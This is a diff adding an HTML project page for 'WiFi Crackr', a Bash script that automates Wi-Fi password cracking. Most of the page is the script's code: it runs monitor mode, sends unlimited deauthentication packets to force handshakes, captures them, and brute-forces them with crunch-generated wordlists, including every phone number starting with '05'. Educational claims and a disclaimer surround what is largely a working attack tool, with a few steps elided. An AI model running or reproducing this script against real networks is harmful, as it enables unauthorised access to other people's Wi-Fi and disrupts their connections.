@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Crackr Project</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1, h2, h3 {
+            color: #2c3e50;
+        }
+        pre {
+            background-color: #f4f4f4;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        .disclaimer {
+            background-color: #ffeeaa;
+            border: 1px solid #e6d180;
+            padding: 10px;
+            margin-top: 20px;
+            border-radius: 5px;
+        }
+        .author {
+            font-size: 0.8em;
+            color: #7f8c8d;
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+    <div class="author">Made by: Omer Shor</div>
+    <h1>WiFi Crackr Project</h1>
+    
+    <p>The WiFi Crackr is a Bash script designed to demonstrate the process of cracking WiFi passwords using readily available tools. This project serves as an educational tool to understand WiFi security and the importance of strong passwords.</p>
+
+    <h2>Project Overview</h2>
+    <p>The script automates the process of:</p>
+    <ul>
+        <li>Setting up the necessary tools</li>
+        <li>Scanning for WiFi networks</li>
+        <li>Capturing network handshakes</li>
+        <li>Attempting to crack the captured handshake</li>
+    </ul>
+
+    <h2>Script Functions</h2>
+
+    <h3>1. colors()</h3>
+    <p>Defines color codes for output formatting:</p>
+    <pre>
+function colors(){
+    RED="\033[0;31m"
+    GREEN="\033[0;32m"
+    YELLOW="\033[0;33m"
+    BLUE="\033[0;34m"
+    PURPLE="\033[0;35m"
+    NC='\033[0m' # No Color
+}
+    </pre>
+
+    <h3>2. d_figlet()</h3>
+    <p>Checks for and installs figlet, then uses it to display the project title:</p>
+    <pre>
+function d_figlet() {
+    if ! command -v figlet &> /dev/null 2>&1; then
+        echo -e "${RED}[-]${NC} Figlet is not installed, start installing figlet."
+        sudo apt update &> /dev/null 2>&1;
+        sudo apt install figlet -y &> /dev/null 2>&1;
+    fi
+    figlet "WiFi Crackr"
+    echo -e "${BLUE}[#]${NC} Hello! and welcome to the WiFi Crackr"
+}
+    </pre>
+
+    <h3>3. d_aircrack()</h3>
+    <p>Checks for and installs aircrack-ng:</p>
+    <pre>
+function d_aircrack(){
+    if ! command -v aircrack-ng &> /dev/null 2>&1; then
+        echo -e "${RED}[-]${NC} aircrack-ng is not installed"
+        echo -e "${BLUE}[#]${NC} start installing aircrack-ng"
+        sudo apt install aircrack-ng -y &> /dev/null 2>&1;
+    else
+        echo -e "${GREEN}[+]${NC} aircrack-ng is installed!"
+    fi
+}
+    </pre>
+
+    <h3>4. d_crunch()</h3>
+    <p>Checks for and installs crunch:</p>
+    <pre>
+function d_crunch(){
+    if ! command -v crunch &> /dev/null 2>&1; then
+        echo -e "${RED}[-]${NC} crunch is not installed"
+        echo -e "${BLUE}[#]${NC} start installing crunch"
+        sudo apt install crunch -y &> /dev/null 2>&1;
+    else
+        echo -e "${GREEN}[+]${NC} crunch is installed!"
+    fi
+}
+    </pre>
+
+    <h3>5. wifi_crackr()</h3>
+    <p>Main function that sets up the environment:</p>
+    <pre>
+wifi_crackr() {
+    echo -e "${BLUE}[#]${NC} Welcome to WiFi Crackr - Your go-to tool for Wi-Fi password cracking using airmon-ng."
+    if [[ $(id -u) != 0 ]]; then
+        echo -e "${RED}[-]${NC} Please run the script with root account"
+        exit 1
+    else
+        echo -e "${GREEN}[+]${NC} You will move forward to start scanning your target, Enjoy!"
+    fi
+    TS=$(date +%H:%M)
+    WiFi_Crackr="WiFi_Crackr_$TS"
+    mkdir -p $WiFi_Crackr
+    cd $WiFi_Crackr
+}
+    </pre>
+
+    <h3>6. interface()</h3>
+    <p>Allows user to select a network interface:</p>
+    <pre>
+function interface(){
+    while true; do
+        echo -e "${BLUE}[#]${NC} Your interfaces"
+        iw dev | grep Interface | awk '{print NR ". " $2}'
+        read -p "$(echo -e "${PURPLE}[?]${NC} Which network interface would you like to use? (enter number): ")" choice
+        selected_interface=$(iw dev | grep Interface | awk -v num="$choice" 'NR == num {print $2}')
+        if [ -n "$selected_interface" ]; then
+            echo -e "${GREEN}[+]${NC} You have selected interface: $selected_interface"
+            break
+        else
+            echo -e "${RED}[-]${NC} Invalid selection. Please try again."
+        fi
+    done
+}
+    </pre>
+
+    <h3>7. airmon()</h3>
+    <p>Prepares the selected interface for monitoring:</p>
+    <pre>
+function airmon(){
+    echo -e "${BLUE}[#]${NC} Checking for any processes that might interfere with airmon-ng..."
+    airmon-ng check kill &> /dev/null 2>&1;
+    echo -e "${BLUE}[#]${NC} Starting monitor mode on the selected interface: $selected_interface "
+    airmon-ng start $selected_interface &> /dev/null 2>&1;
+}
+    </pre>
+
+    <h3>8. airodump()</h3>
+    <p>Scans for WiFi networks and captures data:</p>
+    <pre>
+function airodump(){
+    echo -e "${YELLOW}[!]${NC} The network scan is about to start. To stop it, press Ctrl + C."
+    sleep 5
+    airodump-ng $selected_interface
+    # (Code for getting channel and BSSID from user input)
+    gnome-terminal -- bash -c "sudo airodump-ng -w wificupture -c $channel --bssid $BSSID $selected_interface; exec bash ; disown" 
+}
+    </pre>
+
+    <h3>9. aireplay()</h3>
+    <p>Sends deauthentication packets to capture handshake:</p>
+    <pre>
+function aireplay() {
+    echo -e "${BLUE}[#]${NC} Sending unlimited deauthentication packets to the access point with BSSID $BSSID on interface $selected_interface..."
+    aireplay-ng --deauth 0 -a $BSSID $selected_interface &> /dev/null 2>&1;
+    # (Additional code for handling interruptions and retries)
+}
+    </pre>
+
+    <h3>10. aircrack()</h3>
+    <p>This function attempts to crack the captured handshake using various password list options. It's the core of the password cracking process:</p>
+    <pre>
+function aircrack() {
+    while true
+    do
+        read -p "$(echo -e "${PURPLE}[?]${NC}  To use your own password list, press (1). To use a list of phone numbers, press (2). To create a password list using Crunch, press (3): ")" pass_list
+        if [ "$pass_list" == "1" ] || [ "$pass_list" == "2" ] || [ "$pass_list" == "3" ]
+            then
+                break
+        else
+            echo -e "${RED}[-]${NC} Invalid input. Please enter 1/2/3"
+        fi
+    done
+
+    if [ "$pass_list" == "1" ]
+    then
+        read -p "$(echo -e "${PURPLE}[?]${NC}  Please enter the full path of your password list: ")" user_pass_list
+        aircrack-ng wificupture-01.cap -w "$user_pass_list" | tee Password_cracking.txt
+    elif [ "$pass_list" == "2" ]
+    then
+        echo -e "${BLUE}[#]${NC} Creating a password list of all possible phone numbers starting with 05*"
+        crunch 10 10 -t 05%%%%%%%% -o phone_numbers.txt &> /dev/null 2>&1;
+        echo -e "${BLUE}[#]${NC} Starting the WiFi network password cracking"
+        aircrack-ng wificupture-01.cap -w "phone_numbers.txt" | tee Password_cracking.txt
+    elif [ "$pass_list" == "3" ]
+    then
+        # Code for creating custom password list using Crunch
+        echo -e "${BLUE}[#]${NC} You have chosen to create the password list yourself"
+        # (Code for getting min and max password length)
+        # (Code for custom pattern or charset)
+        echo -e "${GREEN}[+]${NC} Creating your password list, please be patient"
+        crunch $min $max $charset -o $output_file &> /dev/null 2>&1;
+        echo -e "${BLUE}[#]${NC} Starting the WiFi network password cracking"
+        aircrack-ng wificupture-01.cap -w $output_file | tee Password_cracking.txt
+    fi
+
+    if grep -q "KEY FOUND!" Password_cracking.txt
+    then    
+        fpass=$(cat Password_cracking.txt | grep -w "FOUND!" | awk -F "!" '{print $2}' | head -n 1 | awk -F "[" '{print $2}' | awk -F "]" '{print $1}')
+        echo -e "${GREEN}[+]${NC} Password found, the password is: $fpass"
+    else
+        echo -e "${RED}[-]${NC} No matching key found for password cracking"
+    fi
+}
+    </pre>
+
+    <p>This function offers three options for password cracking:</p>
+    <ol>
+        <li><strong>User-defined password list:</strong> The user can provide their own list of passwords to attempt.</li>
+        <li><strong>Phone number list:</strong> The script generates a list of all possible 10-digit phone numbers starting with '05' using the crunch tool.</li>
+        <li><strong>Custom password list:</strong> The user can create a custom password list using crunch, specifying minimum and maximum password lengths, and optionally a custom pattern or character set.</li>
+    </ol>
+
+    <p>Key features of this function include:</p>
+    <ul>
+        <li>User input validation to ensure a valid option is selected.</li>
+        <li>Integration with the crunch tool for generating password lists.</li>
+        <li>Use of aircrack-ng to attempt cracking the captured handshake file (wificupture-01.cap).</li>
+        <li>Output logging to a file (Password_cracking.txt) for later analysis.</li>
+        <li>Parsing of the aircrack-ng output to extract the found password, if successful.</li>
+        <li>Clear success or failure messages to the user.</li>
+    </ul>
+
+    <p>This function demonstrates the importance of password complexity and the potential vulnerabilities of weak passwords, especially in the context of WiFi security.</p>
+
+    <h2>Educational Value</h2>
+    <p>This project demonstrates:</p>
+    <ul>
+        <li>The process of WiFi password cracking</li>
+        <li>The importance of strong, complex passwords for WiFi networks</li>
+        <li>How to use common network security tools</li>
+        <li>Bash scripting techniques for automation</li>
+    </ul>
+
+    <div class="disclaimer">
+        <strong>Disclaimer:</strong> This tool is intended strictly for educational purposes only. It should only be used in controlled environments with explicit permission. Unauthorized use of this tool on networks you do not own or have explicit permission to test is illegal and unethical. The author and presenter of this project do not condone or support any illegal or malicious use of this software.
+    </div>
+</body>
+</html>
